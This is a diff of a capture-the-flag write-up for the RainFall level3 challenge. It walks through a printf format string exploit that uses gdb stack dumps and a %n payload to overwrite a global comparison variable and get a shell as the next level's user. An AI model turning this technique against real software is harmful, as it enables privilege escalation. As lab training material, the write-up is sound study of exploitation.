@@ -68,6 +68,10 @@ Dump of assembler code for function v:
    0x08048519 <+117>:	ret
 End of assembler dump.
 
+In v function we have one call to system function, and in argument we can see "/bin/sh".
+for execute this, we have to pass the comparison: 
+	   0x080484df <+59>:	cmp    $0x40,%eax
+
 We deduce and read online about print exploit.
 It's called a format string exploit.
 
@@ -79,16 +83,56 @@ variable next to printf :
 level3@RainFall:~$ python -c 'print "%x " * 9' | ./level3
 200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078 20782520 
 
-To pass the condition at v + 59, eax must equal to 64
+We need to know what value printf will display to calculate the difference between
+the values of the stack and ours.
 
-level3@RainFall:~$ objdump -t level3
-....
-0804988c g     O .bss	00000004              m
-...
+If we have 41414141 at the end, it is because we write just after the first 3 sections.
+We check in the stack:
 
-m is a global not set variable.
+Breakpoint 1, 0x080484df in v ()
+(gdb) x/32x $esp
+0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
+0xbffff4f0:	0x41414141	0x2e78252e	0x252e7825	0x78252e78
+0xbffff500:	0xbfff000a	0xb7fde2d4	0xb7fde334	0x00000007
+0xbffff510:	0x00000000	0xb7fde000	0xb7fff53c	0xbffff558
+0xbffff520:	0x00000040	0x00000b80	0x00000000	0xb7fde714
+0xbffff530:	0x00000098	0x0000000b	0x00000000	0x00000000
+0xbffff540:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff550:	0x00000000	0xb7fe765d	0xb7e3ebaf	0x080482bb
 
-$(python -c 'print "A" * 12 + "\x8c\x98\x04\x08" + "%x " * 5 + "%x" + "%n"';cat)
-| ./level3
+Yes indeed everything follows, between our AAAA and the beginning we have 4 sections,
+so to exploit the vulnerability of printf we will have to skip the first 3
+section.
+
+The vulnerability in question is the %n, it allows to store at the given address the
+number of characters written by printf. And to modify the comparison.
+
+So we need the address of 'm' the comparison variable.
+
+(gdb) p &m
+$1 = (<data variable, no debug info> *) 0x804988c
+
+And the value of the comparison which is 0x40 so 64.
+
+We do a first test with: 
+python -c 'print "\x8c\x98\x04\x08" + "%x" * 3 + "%n"'
+
+(gdb) i r
+eax            0x17	23
+
+Yes eax (m) has been modified.
+We need 64, 64 - 23 = 41.
+We will add a padding of 41 for the size.
+
+python -c 'print "\x8c\x98\x04\x08" + "%x" * 2 + "%41x" + "%n"'
+(gdb) i r
+eax            0x38	56
+
+We are still missing 8 bytes:
+level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "%x" * 2 + "%49x" + "%n"' ; cat) | ./level3
+�200b7fd1ac0                                         b7ff37d0
+Wait what?!
+whoami
+level4
 
 
